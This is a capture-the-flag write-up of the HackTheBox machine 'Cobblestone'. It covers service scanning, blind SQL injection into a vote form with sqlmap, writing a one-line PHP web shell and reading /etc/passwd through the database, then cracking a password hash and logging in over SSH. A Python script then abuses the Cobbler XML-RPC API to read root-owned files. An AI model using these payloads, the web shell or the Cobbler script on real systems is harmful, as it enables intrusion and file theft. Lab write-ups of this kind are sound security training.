- - - 
created : 30-09-2025 

Tags : #insane

Released on 09 Aug 2025 (Season 8)
- - - 
# UPDATES
## 19TH AUGUST, 2025

Patched two intended vectors

First, an SQL file write was introduced when the machine was upgraded to mariadb version 10.11.11. This version grants CAP_DAC_OVERWRITE and CAP_AUDIT_WRITE to the mariadb binary, allowing the database to access any file as a non-root user. Upgraded mariadb again to newer version that removes these capabilities. Second, mitigated an issue where a webshell could be uploaded using specially crafted image files.
# Recon
## Rustscan - Nmap

First we add the target IP to our `/etc/hosts` file, then we use [Rustscan](../../../3%20-%20Tags/Hacking%20Tools/Rustscan.md) that will pass the result to [Nmap](../../../3%20-%20Tags/Hacking%20Tools/Nmap.md) :

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Cobblestone]
└─$ rustscan -a cobblestone.htb -- -A   
Open 10.10.11.81:22
Open 10.10.11.81:80

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)

80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.62
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.62 (Debian)
|_http-title: Cobblestone - Official Website
```

Port `22` and `80`.
# Enumeration
## HTTP (80)
### Dirsearch

We can use [Dirsearch](../../../3%20-%20Tags/Hacking%20Tools/Dirsearch.md) to start [Enumeration](../../../3%20-%20Tags/Hacking%20Concepts/Enumeration.md) on the target :

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Cobblestone]
└─$ dirsearch -u cobblestone.htb    

[20:19:36] Starting:                                                                            
[20:19:39] 301 -  315B  - /js  ->  http://cobblestone.htb/js/                              
[20:20:02] 200 -   14KB - /composer.lock                                    
[20:20:02] 200 -   56B  - /composer.json                                    
[20:20:04] 301 -  316B  - /css  ->  http://cobblestone.htb/css/             
[20:20:05] 301 -  315B  - /db  ->  http://cobblestone.htb/db/               
[20:20:06] 200 -    0B  - /download.php                                     
[20:20:12] 301 -  316B  - /img  ->  http://cobblestone.htb/img/             
[20:20:14] 301 -  323B  - /javascript  ->  http://cobblestone.htb/javascript/
[20:20:19] 200 -    1KB - /login.php                                        
[20:20:20] 302 -    0B  - /logout.php  ->  login.php                        
[20:20:34] 200 -    0B  - /register.php                                     
[20:20:39] 301 -  318B  - /skins  ->  http://cobblestone.htb/skins/         
[20:20:39] 302 -   81B  - /skins.php  ->  login.php                         
[20:20:47] 301 -  322B  - /templates  ->  http://cobblestone.htb/templates/ 
[20:20:50] 403 -   14B  - /upload.php                                       
[20:20:50] 403 -   14B  - /user.php                                         
[20:20:52] 200 -    0B  - /vendor/autoload.php                              
[20:20:52] 200 -    0B  - /vendor/composer/autoload_files.php
[20:20:52] 200 -    0B  - /vendor/composer/autoload_classmap.php            
[20:20:52] 200 -    0B  - /vendor/composer/autoload_real.php                
[20:20:52] 200 -    0B  - /vendor/composer/ClassLoader.php
[20:20:52] 200 -    0B  - /vendor/composer/autoload_namespaces.php
[20:20:52] 200 -    1KB - /vendor/composer/LICENSE                          
[20:20:52] 200 -    0B  - /vendor/composer/autoload_static.php              
[20:20:52] 200 -   14KB - /vendor/composer/installed.json
[20:20:52] 200 -    0B  - /vendor/composer/autoload_psr4.php

Task Completed
```

Main page:

![Pasted image 20250930202504.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250930202504.png)

We add these to `/etc/hosts` file:

```
	mc.cobblestone.htb  | deploy.cobblestone.htb | vote.cobblestone.htb
```

Found this allows to see your username, first name, last name, and role : http://cobblestone.htb/skins_app_admin_server_info.php
### Deploy

![Pasted image 20250930202832.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250930202832.png)

Also use [Dirsearch](../../../3%20-%20Tags/Hacking%20Tools/Dirsearch.md) or [Gobuster](../../../3%20-%20Tags/Hacking%20Tools/Gobuster.md):

```bash
[20:35:34] 301 -  329B  - /js  ->  http://deploy.cobblestone.htb/js/        
[20:35:52] 301 -  330B  - /css  ->  http://deploy.cobblestone.htb/css/      
[20:35:59] 301 -  330B  - /img  ->  http://deploy.cobblestone.htb/img/      
[20:36:00] 301 -  337B  - /javascript  ->  http://deploy.cobblestone.htb/javascript/
```

### Vote

We can start registering an account and enter:

![Pasted image 20250930204507.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250930204507.png)

**Suggest**

![Pasted image 20251101100750.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020251101100750.png)

We can enter a server for approval, maybe there's [Server Side Request Forgery (SSRF)](../../../3%20-%20Tags/Hacking%20Concepts/Server%20Side%20Request%20Forgery%20(SSRF).md) or **RCI**.

If we go to `/details.php` we have this pop-up:

![Pasted image 20251101101130.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020251101101130.png)

We try a dumb upload in the server form:

![Pasted image 20251101101254.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020251101101254.png)

We can see `id=5` in `details.php`, let's intercept this request.
### Caido

Now we use [Caido](../../../3%20-%20Tags/Hacking%20Tools/Caido.md) or [BurpSuite](../../../3%20-%20Tags/Hacking%20Tools/BurpSuite.md) to intercept the suggestion request entering `/suggest.php`:

![Pasted image 20251101102029.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020251101102029.png)

When we upload a new suggestion the site gives us a new `id` number:

![Pasted image 20251101102840.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020251101102840.png)

LFI and SSRF fails here too but are worth trying.

Here we try [SQL Injection](../../../3%20-%20Tags/Hacking%20Concepts/SQL%20Injection.md) entering `'`, we can see the output is URL encoded so we'll do the same:

![Pasted image 20251101103308.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020251101103308.png)

And we `GET` on the given `id`:

![Pasted image 20251101103408.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020251101103408.png)

We got `500`, this is a good signal for [SQL Injection](../../../3%20-%20Tags/Hacking%20Concepts/SQL%20Injection.md).
# Exploit
## Blind SQL Injection

After trying some payloads we find something that's working, like the `UNION` query technique:

```bash
cn' union select 1,2,3,4,5-- -
```

![Pasted image 20251101104939.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020251101104939.png)
![Pasted image 20251101105058.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020251101105058.png)

We check it:

![Pasted image 20251101105127.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020251101105127.png)

So we have **Blind SQli** and we get `200` on the 5 columns request, that's BINGO for us.
### SQLmap

Now we'll use [SQLmap](../../../3%20-%20Tags/Hacking%20Tools/SQLmap.md) to check for SQli types on the form automatically.

Create `req` file:

```bash
└─$ cat req 
POST /suggest.php HTTP/1.1
Host: vote.cobblestone.htb
Content-Length: 49
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Origin: http://vote.cobblestone.htb
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://vote.cobblestone.htb/index.php
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=uhph8mtr2fl5lvmg1o84bsrr6e
Connection: keep-alive

url=http%3A%2F%2Fvote.cobblestone.htb%2Findex.php
```

Now use it:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Cobblestone/user]
└─$ sqlmap -r req --batch                                                            

[INFO] parsing HTTP request from 'req'
[INFO] resuming back-end DBMS 'mysql' 
[INFO] testing connection to the target URL
got a 302 redirect to 'http://vote.cobblestone.htb/details.php?id=277'. Do you want to follow? [Y/n] Y
redirect is a result of a POST request. Do you want to resend original POST data to a new location? [Y/n] Y
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: url (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: url=http://vote.cobblestone.htb/index.php' AND 6660=6660 AND 'MbmT'='MbmT

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: url=http://vote.cobblestone.htb/index.php' AND (SELECT 6186 FROM (SELECT(SLEEP(5)))aSzS) AND 'UlLm'='UlLm

    Type: UNION query
    Title: Generic UNION query (NULL) - 5 columns
    Payload: url=-4648' UNION ALL SELECT CONCAT(0x7176767071,0x6e486e6a746456735a6857735a545a564477515949616c6855566444586f416655564a714168536a,0x71766a6a71),NULL,NULL,NULL,NULL-- -
---
[INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian
web application technology: Apache 2.4.62
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)                   
```

The results show these injection types:
- Boolean-based blind SQL injection
- Time-based blind SQL injection
- Union-query SQL injection

Enumerate db privileges:

```bash
└─$ sqlmap -r req --batch --privilege  

[INFO] fetching database users privileges
database management system users privileges:
[*] 'voteuser'@'localhost' [1]:
    privilege: FILE
```

We get `FILE` privilege which allow us to read files from system and also write.

Check the database:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Cobblestone/user]
└─$ sqlmap -r req --batch --dbs 

[INFO] fetching database names
available databases [2]:
[*] information_schema
[*] vote
```

Read the `vote` db:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Cobblestone/user]
└─$ sqlmap -r req --batch -D vote --tables

Parameter: url (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: url=http://vote.cobblestone.htb/index.php' AND 6660=6660 AND 'MbmT'='MbmT

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: url=http://vote.cobblestone.htb/index.php' AND (SELECT 6186 FROM (SELECT(SLEEP(5)))aSzS) AND 'UlLm'='UlLm

    Type: UNION query
    Title: Generic UNION query (NULL) - 5 columns
    Payload: url=-4648' UNION ALL SELECT CONCAT(0x7176767071,0x6e486e6a746456735a6857735a545a564477515949616c6855566444586f416655564a714168536a,0x71766a6a71),NULL,NULL,NULL,NULL-- -
---

Database: vote
[2 tables]
+-------+
| users |
| votes |
+-------+
```

Try to dump the `users` table:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Cobblestone/user]
└─$ sqlmap -r req --batch -D vote -T users --dump

[WARNING] unable to enumerate the columns for table 'users' in database 'vote'
[WARNING] HTTP error codes detected during run:
500 (Internal Server Error) - 9 times
```

We can't.
### RCE

Now we try to upload a shell, we can do it with [SQLmap](../../../3%20-%20Tags/Hacking%20Tools/SQLmap.md)

Create a `shell.php` file:

```php
└─$ cat shell.php 
<?php system($_GET['cmd']); ?>
```

Now use the [SQLmap](../../../3%20-%20Tags/Hacking%20Tools/SQLmap.md) command to upload:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Cobblestone/user]
└─$ sqlmap -r req --batch --file-write shell.php --file-dest /var/tmp/shell.php

[INFO] the remote file '/var/tmp/shell.php' is larger (35 B) than the local file 'shell.php' (31B)

# Original command
└─$ sqlmap -r req --batch --file-write shell.php --file-dest /var/www/vote/shell.php
```

We can still write in other directories like `/var/tmp/shell.php` but they seems not web accessible.

Open a listener:

```bash
└─$ nc -lvnp 1337 
listening on [any] 1337 ...
```

And catch the shell on the server.

Reading works for some files:

```bash
└─$ sqlmap -r req --batch --file-read /etc/passwd
files saved to [1]:
[*] /home/mdn0x/.local/share/sqlmap/output/vote.cobblestone.htb/files/_etc_passwd (same file)

└─$ cat /home/mdn0x/.local/share/sqlmap/output/vote.cobblestone.htb/files/_etc_passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
messagebus:x:100:107::/nonexistent:/usr/sbin/nologin
avahi-autoipd:x:101:109:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin
sshd:x:102:65534::/run/sshd:/usr/sbin/nologin
cobble:x:1000:1000:cobble,,,:/home/cobble:/bin/rbash
mysql:x:103:112:MySQL Server,,,:/nonexistent:/bin/false
tftp:x:104:113:tftp daemon,,,:/srv/tftp:/usr/sbin/nologin
_laurel:x:999:996::/var/log/laurel:/bin/false
john:x:1001:1001:,,,:/home/john:/bin/bash

└─$ cat /home/mdn0x/.local/share/sqlmap/output/vote.cobblestone.htb/files/_etc_apache2_sites-available_000-default.conf 
<VirtualHost *:80>
        RewriteEngine On
        RewriteCond %{HTTP_HOST} !^cobblestone.htb$
        RewriteRule /.* http://cobblestone.htb/ [R]
        ServerName 127.0.0.1
        ProxyPass "/cobbler_api" "http://127.0.0.1:25151/"
        ProxyPassReverse "/cobbler_api" "http://127.0.0.1:25151/"
</VirtualHost>

<VirtualHost *:80>
        ServerName cobblestone.htb

        ServerAdmin cobble@cobblestone.htb
        DocumentRoot /var/www/html

        <Directory /var/www/html>
                AAHatName cobblestone
        </Directory>

        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined

        RewriteEngine On
        RewriteCond %{HTTP_HOST} !^cobblestone.htb$
        RewriteRule /.* http://cobblestone.htb/ [R]

        Alias /cobbler /srv/www/cobbler

        <Directory /srv/www/cobbler>
                Options Indexes FollowSymLinks
                AllowOverride None
                Require all granted
        </Directory>

</VirtualHost>

<VirtualHost *:80>
        ServerName deploy.cobblestone.htb

        ServerAdmin cobble@cobblestone.htb
        DocumentRoot /var/www/deploy

        RewriteEngine On
        RewriteCond %{HTTP_HOST} !^deploy.cobblestone.htb$
        RewriteRule /.* http://deploy.cobblestone.htb/ [R]
</VirtualHost>

<VirtualHost *:80>
        ServerName vote.cobblestone.htb

        ServerAdmin cobble@cobblestone.htb
        DocumentRoot /var/www/vote

        RewriteEngine On
        RewriteCond %{HTTP_HOST} !^vote.cobblestone.htb$
        RewriteRule /.* http://vote.cobblestone.htb/ [R]
</VirtualHost>
```

We have a shell as `www-data` user, we found a `connection.php` file with`dbuser` credentials:

```bash
www-data@cobblestone:/var/www/html/db$ cat connection.php
<?php  

$dbserver = "localhost"; 
$username = "dbuser"; 
$password = "HTB{REDACTED_PASSWD}"; 
$dbname = "cobblestone";  
$conn = new mysqli($dbserver, $username, $password, $dbname);
  
// Check connection 
if ($conn->connect_errno > 0) {
     die("Connection failed: " . $conn->connect_error); } ?>`
```

Let's try on [MySQL](../../../3%20-%20Tags/Hacking%20Tools/MySQL.md):

```bash
www-data@cobblestone:/var/www/html/db$ mysql -h 127.0.0.1 -u dbuser -p'HTB{REDACTED_PASSWD}'

MariaDB [(none)]> use cobblestone;
MariaDB [vote]> select * from users;

admin :   HTB{REDACTED_HASH}
cobble :  HTB{REDACTED_HASH}
```

Try cracking it with [Hashcat](../../../3%20-%20Tags/Hacking%20Tools/Hashcat.md):

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Cobblestone/user]
└─$ hashcat -m 1400 hash /usr/share/wordlists/rockyou.txt 

HTB{REDACTED_HASH}:HTB{REDACTED_PASSWD}
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 1400 (SHA2-256)
```

And we find the ssh password for `cobble` user.
## SSH

We can use the found credentials to enter [SSH](../../../3%20-%20Tags/Hacking%20Concepts/SSH.md):

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Cobblestone/user]
└─$ ssh cobble@cobblestone.htb
cobble@cobblestone.htb password: 

cobble@cobblestone:~$ cat user.txt 
    HTB{REDACTED_FLAG}
```

User flag obtained successfully.
# Privilege Escalation

## Cobble to Root (Fast path)

We can find port `25151` locally open with `ss -tulnp`, after online documentation about the server we find out [Cobbler XMLRPC API](https://github.com/cobbler/cobbler/wiki/XMLRPC-API) so now we know that is used as follows:  

- Linux provisioning server - deploy operating systems.
- PXE boot management - network-based OS installation.
- Configuration management - automated system setup.
- XML-RPC API on port 25151 for remote management.

**READ** also:
[Cobbler Multiple Vulnerabilities](https://tnpitsecurity.com/blog/cobbler-multiple-vulnerabilities/)

We can craft and use this type of mixed script to access the root flag importing the `xmlrpc` [Python](../../../3%20-%20Tags/Programming%20Languages/Python.md) module: 

```python
└─$ cat script                     

import xmlrpc.client

KERNEL = "/boot/vmlinuz-6.1.0-37-amd64"
INITRD = "/boot/initrd.img-6.1.0-37-amd64"
TARGET = "/root/root.txt"
NAME = "pwnsys"
DEST = "/leak"

srv = xmlrpc.client.ServerProxy("http://127.0.0.1:25151/RPC2", allow_none=True)
tok = srv.login("", -1)

# Fake distro
did = srv.new_distro(tok)
srv.modify_distro(did,"name","pwn_distro", tok)
srv.modify_distro(did,"arch","x86_64", tok)
srv.modify_distro(did,"breed","redhat", tok)
srv.modify_distro(did,"kernel", KERNEL, tok)
srv.modify_distro(did,"initrd", INITRD, tok)
srv.save_distro(did, tok)

# Fake profile
pid = srv.new_profile(tok)
srv.modify_profile(pid,"name","pwn_profile", tok)
srv.modify_profile(pid,"distro","pwn_distro", tok)
srv.save_profile(pid, tok)

# System with file mapping
sid = srv.new_system(tok)
srv.modify_system(sid,"name", NAME, tok)
srv.modify_system(sid,"profile","pwn_profile", tok)
srv.modify_system(sid,"template_files", {TARGET: DEST}, tok)
srv.save_system(sid, tok)

# Trigger synchronization
srv.sync(tok)
```

This script is gonna abuse Cobbler features to copy arbitrary files from the target server to a web accessible location.

After running the script on the target, we can `curl` to get the file:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Cobblestone/root]
└─$ curl -X POST http://127.0.0.1:25151 -H "Content-Type: text/xml" -d '<?xml version="1.0"?><methodCall><methodName>get_template_file_for_system</methodName><params><param><value><string>pwnsys</string></value></param><param><value><string>/leak</string></value></param></params></methodCall>'
<?xml version='1.0'?>
<methodResponse>
<params>
<param>
<value><string>HTB{REDACTED_FLAG}
</string></value>
</param>
</params>
</methodResponse>
```

And we have the root flag.

> [!NOTE]
> For this machine, there is also an unintended way to get both user and root from [Cross-site Scripting (XSS)](../../../3%20-%20Tags/Hacking%20Concepts/Cross-site%20Scripting%20(XSS).md) and admin session hijacking

Pwned !!

